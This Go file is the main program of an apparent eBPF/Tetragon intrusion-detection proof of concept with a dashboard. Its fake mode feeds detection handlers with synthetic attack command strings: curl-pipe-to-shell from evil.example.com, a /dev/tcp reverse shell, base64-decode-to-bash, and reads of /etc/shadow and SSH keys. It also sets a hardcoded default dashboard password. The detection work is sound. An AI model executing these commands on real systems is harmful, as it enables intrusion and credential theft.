package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/cilium/tetragon/api/v1/tetragon"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/protobuf/types/known/wrapperspb"

	"github.com/jeffmk/ebpf-poc-engine/internal/api"
	"github.com/jeffmk/ebpf-poc-engine/internal/score"
	"github.com/jeffmk/ebpf-poc-engine/internal/store"
	"github.com/jeffmk/ebpf-poc-engine/internal/tree"
)

func main() {
	var (
		tetragonAddr = flag.String("tetragon", "unix:///var/run/tetragon/tetragon.sock", "Tetragon gRPC address")
		dbPath       = flag.String("db", "events.db", "SQLite database path")
		httpAddr     = flag.String("http", ":8080", "HTTP listen address")
		fakeMode     = flag.Bool("fake", false, "synthesize events instead of connecting to Tetragon (dev/UI mode)")
		authUser     = flag.String("user", "admin", "dashboard username")
		authPass     = flag.String("pass", "ebpf-soc-demo", "dashboard password")
		policiesDir  = flag.String("policies", "policies", "directory containing TracingPolicy YAMLs (for read-only viewer)")
		attacksDir   = flag.String("attacks", "attacks", "directory containing allowlisted attack scripts (for quick-fire panel)")
		honeypotDir  = flag.String("honeypots", "/var/lib/ebpf-engine/honey", "directory where decoy files are seeded; access fires alerts when watched by sensitive-files policy")
	)
	flag.Parse()
	api.SetPolicyDir(*policiesDir)
	api.SetAttackDir(*attacksDir)
	if err := api.EnsureHoneypots(*honeypotDir); err != nil {
		log.Printf("honeypots: setup failed (%v) — continuing without decoys", err)
	} else {
		log.Printf("honeypots: seeded at %s", *honeypotDir)
	}

	st, err := store.New(*dbPath)
	if err != nil {
		log.Fatalf("store: %v", err)
	}
	defer st.Close()

	pt := tree.New(10 * time.Minute)
	broadcast := make(chan api.Broadcast, 1024)

	auth, err := api.NewAuth(*authUser, *authPass)
	if err != nil {
		log.Fatalf("auth: %v", err)
	}
	httpSrv := api.NewServer(st, pt, broadcast, auth)
	go func() {
		if err := httpSrv.Start(*httpAddr); err != nil {
			log.Fatalf("http: %v", err)
		}
	}()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sigC := make(chan os.Signal, 1)
	signal.Notify(sigC, syscall.SIGINT, syscall.SIGTERM)
	go func() { <-sigC; log.Println("shutting down"); cancel() }()

	if *fakeMode {
		log.Println("fake mode: synthesizing events (no Tetragon required)")
		runFake(ctx, st, pt, broadcast)
		return
	}

	conn, err := grpc.Dial(*tetragonAddr,
		grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		log.Fatalf("dial tetragon: %v", err)
	}
	defer conn.Close()

	client := tetragon.NewFineGuidanceSensorsClient(conn)

	stream, err := client.GetEvents(ctx, &tetragon.GetEventsRequest{})
	if err != nil {
		log.Fatalf("get events: %v", err)
	}

	log.Println("subscribed to Tetragon event stream")

	for {
		resp, err := stream.Recv()
		if err != nil {
			log.Printf("stream closed: %v", err)
			return
		}
		handleEvent(resp, st, pt, broadcast)
	}
}

// runFake synthesizes a deterministic stream of attack-pattern events
// through the same handlers. It exists so the UI, scoring, SSE, and
// SQLite paths can be exercised end-to-end without a Linux/Tetragon
// host. It runs until ctx is cancelled.
func runFake(ctx context.Context, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
	scenarios := []func(seq int, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast){
		fakeWebshell,
		fakeReverseShell,
		fakeCredentialTheft,
		fakePrivEsc,
		fakeLOLBin,
	}

	tick := time.NewTicker(4 * time.Second)
	defer tick.Stop()

	seq := 0
	scenarios[seq%len(scenarios)](seq, st, pt, broadcast)
	seq++

	for {
		select {
		case <-ctx.Done():
			return
		case <-tick.C:
			scenarios[seq%len(scenarios)](seq, st, pt, broadcast)
			seq++
		}
	}
}

func fakeProcess(execID string, pid, uid uint32, binary, args string) *tetragon.Process {
	return &tetragon.Process{
		ExecId:    execID,
		Pid:       wrapperspb.UInt32(pid),
		Uid:       wrapperspb.UInt32(uid),
		Binary:    binary,
		Arguments: args,
	}
}

func fakeFileArg(path string) *tetragon.KprobeArgument {
	return &tetragon.KprobeArgument{
		Arg: &tetragon.KprobeArgument_FileArg{FileArg: &tetragon.KprobeFile{Path: path}},
	}
}

func fakeIntArg(v int32) *tetragon.KprobeArgument {
	return &tetragon.KprobeArgument{
		Arg: &tetragon.KprobeArgument_IntArg{IntArg: v},
	}
}

func fakeWebshell(seq int, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
	parent := fmt.Sprintf("fake-bash-%d", seq)
	child := fmt.Sprintf("fake-curl-%d", seq)
	handleExec(&tetragon.ProcessExec{
		Process: fakeProcess(parent, 1000, 1000, "/bin/bash", "-c 'curl evil.example.com | sh'"),
	}, st, pt, broadcast)
	handleExec(&tetragon.ProcessExec{
		Process: fakeProcess(child, 1001, 1000, "/usr/bin/curl", "-fsSL https://evil.example.com/payload.sh | sh"),
		Parent:  fakeProcess(parent, 1000, 1000, "/bin/bash", ""),
	}, st, pt, broadcast)
	handleKprobe(&tetragon.ProcessKprobe{
		Process:    fakeProcess(child, 1001, 0, "/usr/bin/curl", ""),
		PolicyName: "sensitive-file-access",
		Args:       []*tetragon.KprobeArgument{fakeFileArg("/etc/shadow"), fakeIntArg(4)},
	}, st, pt, broadcast)
}

func fakeReverseShell(seq int, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
	bashID := fmt.Sprintf("fake-rsh-bash-%d", seq)
	handleExec(&tetragon.ProcessExec{
		Process: fakeProcess(bashID, 2000, 1000, "/bin/bash", "-c 'exec 3<>/dev/tcp/127.0.0.1/4444'"),
	}, st, pt, broadcast)
	handleKprobe(&tetragon.ProcessKprobe{
		Process:    fakeProcess(bashID, 2000, 1000, "/bin/bash", ""),
		PolicyName: "outbound-connections",
		Args:       []*tetragon.KprobeArgument{},
	}, st, pt, broadcast)
}

func fakeCredentialTheft(seq int, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
	bashID := fmt.Sprintf("fake-cred-bash-%d", seq)
	handleExec(&tetragon.ProcessExec{
		Process: fakeProcess(bashID, 3000, 0, "/bin/bash", "-c 'cat /etc/shadow'"),
	}, st, pt, broadcast)
	for _, target := range []string{"/etc/shadow", "/etc/sudoers", "/root/.ssh/id_rsa"} {
		handleKprobe(&tetragon.ProcessKprobe{
			Process:    fakeProcess(bashID, 3000, 0, "/bin/bash", ""),
			PolicyName: "sensitive-file-access",
			Args:       []*tetragon.KprobeArgument{fakeFileArg(target), fakeIntArg(4)},
		}, st, pt, broadcast)
	}
}

func fakePrivEsc(seq int, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
	bashID := fmt.Sprintf("fake-priv-bash-%d", seq)
	sudoID := fmt.Sprintf("fake-priv-sudo-%d", seq)
	handleExec(&tetragon.ProcessExec{
		Process: fakeProcess(bashID, 4000, 1000, "/bin/bash", ""),
	}, st, pt, broadcast)
	handleExec(&tetragon.ProcessExec{
		Process: fakeProcess(sudoID, 4001, 1000, "/usr/bin/sudo", "-i"),
		Parent:  fakeProcess(bashID, 4000, 1000, "/bin/bash", ""),
	}, st, pt, broadcast)
	handleKprobe(&tetragon.ProcessKprobe{
		Process:    fakeProcess(sudoID, 4001, 0, "/usr/bin/sudo", ""),
		PolicyName: "privilege-escalation",
		Args:       []*tetragon.KprobeArgument{fakeIntArg(0)},
	}, st, pt, broadcast)
}

func fakeLOLBin(seq int, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
	id := fmt.Sprintf("fake-lol-bash-%d", seq)
	handleExec(&tetragon.ProcessExec{
		Process: fakeProcess(id, 5000, 1000, "/bin/bash", "-c 'echo aGVsbG8K | base64 -d | bash'"),
	}, st, pt, broadcast)
}

func handleEvent(resp *tetragon.GetEventsResponse, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
	switch ev := resp.Event.(type) {
	case *tetragon.GetEventsResponse_ProcessExec:
		handleExec(ev.ProcessExec, st, pt, broadcast)
	case *tetragon.GetEventsResponse_ProcessKprobe:
		handleKprobe(ev.ProcessKprobe, st, pt, broadcast)
	case *tetragon.GetEventsResponse_ProcessExit:
		// no-op for PoC
	}
}

func handleExec(ev *tetragon.ProcessExec, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
	if ev == nil || ev.Process == nil {
		return
	}
	p := ev.Process
	parentID := ""
	if ev.Parent != nil {
		parentID = ev.Parent.ExecId
	}
	node := &tree.Node{
		ExecID:    p.ExecId,
		PID:       p.Pid.GetValue(),
		ParentID:  parentID,
		Binary:    p.Binary,
		Args:      p.Arguments,
		UID:       p.Uid.GetValue(),
		StartTime: time.Now(),
	}
	pt.Add(node)

	delta, reason := score.Score("process_exec", p.Binary, p.Arguments, "", p.Uid.GetValue())
	if delta > 0 {
		pt.AddScore(p.ExecId, delta, "process_exec")
	}

	parentPID := uint32(0)
	if ev.Parent != nil {
		parentPID = ev.Parent.Pid.GetValue()
	}

	e := &store.Event{
		Timestamp: time.Now(),
		EventType: "process_exec",
		PID:       p.Pid.GetValue(),
		ParentPID: parentPID,
		ExecID:    p.ExecId,
		Binary:    p.Binary,
		Args:      p.Arguments,
		UID:       p.Uid.GetValue(),
	}
	id, err := st.InsertEvent(e)
	if err != nil {
		log.Printf("insert event: %v", err)
		return
	}
	e.ID = id

	send(broadcast, api.Broadcast{Type: "event", Payload: e})
	checkAlert(p.ExecId, st, pt, broadcast, reason)
}

func handleKprobe(ev *tetragon.ProcessKprobe, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
	if ev == nil || ev.Process == nil {
		return
	}
	p := ev.Process
	policyName := ev.PolicyName

	argStr := extractKprobeArgs(ev.Args)

	delta, reason := score.Score("process_kprobe", p.Binary, argStr, policyName, p.Uid.GetValue())
	if delta > 0 {
		pt.AddScore(p.ExecId, delta, "process_kprobe:"+policyName)
	}

	e := &store.Event{
		Timestamp:  time.Now(),
		EventType:  "process_kprobe",
		PID:        p.Pid.GetValue(),
		ExecID:     p.ExecId,
		Binary:     p.Binary,
		Args:       argStr,
		UID:        p.Uid.GetValue(),
		PolicyName: policyName,
	}
	id, err := st.InsertEvent(e)
	if err != nil {
		log.Printf("insert event: %v", err)
		return
	}
	e.ID = id

	send(broadcast, api.Broadcast{Type: "event", Payload: e})
	checkAlert(p.ExecId, st, pt, broadcast, reason)
}

func extractKprobeArgs(args []*tetragon.KprobeArgument) string {
	parts := make([]string, 0, len(args))
	for _, a := range args {
		if a == nil {
			continue
		}
		if f := a.GetFileArg(); f != nil && f.Path != "" {
			parts = append(parts, f.Path)
			continue
		}
		if p := a.GetPathArg(); p != nil && p.Path != "" {
			parts = append(parts, p.Path)
			continue
		}
		if s := a.GetStringArg(); s != "" {
			parts = append(parts, s)
			continue
		}
		if v := a.GetIntArg(); v != 0 {
			parts = append(parts, fmt.Sprintf("%d", v))
			continue
		}
	}
	return strings.Join(parts, " ")
}

func checkAlert(execID string, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast, reason string) {
	chainScore := pt.ChainScore(execID)
	if chainScore < 10 {
		return
	}
	severity := score.Severity(chainScore)
	chain := pt.Ancestors(execID, 8)
	binaries := make([]string, 0, len(chain))
	for _, n := range chain {
		binaries = append(binaries, n.Binary)
	}
	title := fmt.Sprintf("Suspicious chain: %s (score %d)", strings.Join(binaries, " → "), chainScore)
	a := &store.Alert{
		Timestamp:   time.Now(),
		Severity:    severity,
		Title:       title,
		Description: reason,
		ExecID:      execID,
		Score:       chainScore,
	}
	id, err := st.InsertAlert(a)
	if err != nil {
		log.Printf("insert alert: %v", err)
		return
	}
	a.ID = id
	send(broadcast, api.Broadcast{Type: "alert", Payload: a})
	log.Printf("[ALERT %s] %s", severity, title)
}

func send(ch chan<- api.Broadcast, b api.Broadcast) {
	select {
	case ch <- b:
	default:
		// drop on overflow rather than block the event loop
	}
}
